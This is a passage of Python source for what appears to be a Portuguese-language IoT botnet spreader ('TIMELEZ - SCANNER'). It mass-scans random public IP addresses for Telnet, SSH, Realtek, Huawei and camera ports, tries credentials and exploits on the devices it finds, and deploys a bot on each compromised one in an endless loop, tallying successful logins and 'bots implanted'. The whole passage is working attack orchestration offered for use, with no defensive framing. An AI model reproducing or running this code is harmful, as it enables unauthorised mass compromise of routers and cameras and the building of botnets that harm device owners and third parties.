            random_ips.extend(batch)
        
        isp_ips = TargetExpansion.generate_isp_targets()
        
        all_ips = random_ips[:120000] + isp_ips[:30000]
        
        scanner = FastPortScanner(TargetExpansion.get_expanded_ports())
        results = scanner.scan_batch(all_ips[:120000], timeout=1.2)
        
        total_open = sum(len(ips) for ips in results.values())
        with self.stats_lock:
            self.stats['total_ips'] = len(all_ips)
            self.stats['open_ports'] = total_open
        
        print(GREEN + f"[+] Portas abertas: {total_open}")
        return results
    
    def _generate_random_ips(self, count: int) -> List[str]:
        ips = []
        for _ in range(count):
            octet1 = random.randint(1, 223)
            if octet1 == 127 or (octet1 == 10) or (octet1 == 172 and random.randint(16, 31)):
                continue
            if octet1 == 192 and random.randint(168, 168) == 168:
                continue
            ip = f"{octet1}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            ips.append(ip)
        return ips
    
    def credential_test_phase(self, targets: Dict[int, List[str]]):
        print(GREEN + "\n[FASE 2] Teste multi-exploit...")
        
        scan_targets = []
        
        port_scanner_map = {
            23: "TELNET",
            2323: "TELNET",
            22: "SSH",
            2222: "SSH",
            52869: "REALTEK",
            37215: "HUAWEI",
            80: "CAMERA",
            443: "CAMERA",
            8080: "CAMERA",
            554: "CAMERA",
            37777: "CAMERA",
        }
        
        for port, ips in targets.items():
            if not ips:
                continue
            
            scanner_type = port_scanner_map.get(port)
            if not scanner_type:
                continue
            
            for ip in ips[:1500]:
                scan_targets.append((ip, port, scanner_type))
        
        if not scan_targets:
            return
        
        print(CYAN + f"[+] Testando {len(scan_targets)} alvos com multi-exploit...")
        
        results = self.optimized_scanner.parallel_credential_test(scan_targets)
        
        with self.stats_lock:
            self.stats['successful_logins'] += len(results)
            self.stats['real_devices'] = sum(1 for r in results if r.confidence >= 80)
        
        for result in results:
            if result.confidence >= 80:
                color = GREEN
                device_status = "REAL"
            elif result.confidence >= 60:
                color = YELLOW
                device_status = "POSSIVEL"
            else:
                continue
            
            creds_display = f"{result.credentials[0]}:{result.credentials[1]}" if result.credentials else "NO_AUTH"
            print(f"{color}[{result.scanner_type}] {result.ip}:{result.port} - {creds_display} - CONF:{result.confidence} - {result.device_type} ({result.architecture}) - {device_status}")
            
            if result.confidence >= 75:
                bot_deployed = False
                if result.scanner_type == "TELNET" and result.credentials:
                    bot_deployed = BotDeployer.deploy_telnet(
                        result.ip, result.port, result.credentials, result.device_type, result.architecture
                    )
                elif result.scanner_type == "SSH" and result.credentials:
                    bot_deployed = BotDeployer.deploy_ssh(result.ip, result.port, result.credentials, result.architecture)
                elif result.scanner_type in ["REALTEK", "HUAWEI", "CAMERA"]:
                    bot_deployed = BotDeployer.deploy_telnet(
                        result.ip, result.port, ("root", ""), result.device_type, result.architecture
                    )
                
                if bot_deployed:
                    result.bot_deployed = True
                    with self.stats_lock:
                        self.stats['bots_deployed'] += 1
                    print(GREEN + f"[+] Bot implantado em {result.ip} ({result.architecture})")
                
                self.reporter.report(result)
    
    def start_continuous_scan(self):
        self.running = True
        
        scan_thread = threading.Thread(target=self._continuous_scanner, daemon=True)
        scan_thread.start()
        
        stats_thread = threading.Thread(target=self._stats_monitor, daemon=True)
        stats_thread.start()
        
        return scan_thread
    
    def _continuous_scanner(self):
        cycle = 0
        while self.running:
            cycle += 1
            print(f"\n{CYAN}[CICLO {cycle}] Iniciando scan exploit...")
            
            if self.is_root and cycle % 2 == 0:
                targets = self.zmap_scan_phase()
            else:
                targets = self.fast_scan_phase()
            
            self.credential_test_phase(targets)
            
            time.sleep(15)
    
    def _stats_monitor(self):
        while self.running:
            time.sleep(20)
            
            with self.stats_lock:
                elapsed = time.time() - self.stats['start_time']
                hours = int(elapsed // 3600)
                minutes = int((elapsed % 3600) // 60)
                seconds = int(elapsed % 60)
                
                ips_per_sec = self.stats['total_ips'] / elapsed if elapsed > 0 else 0
                
                print(f"\n{GREEN}{'='*70}")
                print(f"{GREEN}EXPLOIT SCANNER - {ips_per_sec:.0f}+ IPs/segundo")
                print(f"{GREEN}{'='*70}{RESET}")
                print(f"Tempo: {hours:02d}:{minutes:02d}:{seconds:02d}")
                print(f"IPs testados: {self.stats['total_ips']:,}")
                print(f"Portas abertas: {self.stats['open_ports']:,}")
                print(f"Dispositivos reais: {self.stats['real_devices']:,}")
                print(f"Logins bem-sucedidos: {self.stats['successful_logins']:,}")
                print(f"Bots implantados: {self.stats['bots_deployed']:,}")
                print(f"{GREEN}{'='*70}{RESET}")
    
    def stop(self):
        print(YELLOW + "\n[!] Parando scanner...")
        self.running = False
        self.reporter.stop()
        print(YELLOW + "[!] Scanner parado")

def main():
    
    scanner = MassScanner()
    
    try:
        scanner.initialize()
        time.sleep(2)
        
        print(CYAN + "\nTIMELEZ - SCANNER")
        
        scanner.start_continuous_scan()
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(YELLOW + "\n[!] Interrompido pelo usuário")
    except Exception as e:
        print(RED + f"\n[!] Erro: {e}")
    finally:
        scanner.stop()

if __name__ == "__main__":
    main()
